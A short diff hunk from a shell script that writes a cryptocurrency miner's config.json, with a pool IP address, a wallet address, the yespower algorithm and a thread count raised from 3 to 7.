@@ -10,7 +10,7 @@ cat > config.json <<END
   "url": "45.115.224.242:443",
   "user": "Wig7sz3AnhzfNUn6svr5rfk817LjVApcUW",
   "pass": "c=SWAMP,zap=SWAMP",
-  "threads": 3,
+  "threads": 7,
   "algo": "yespower"
 }
 END
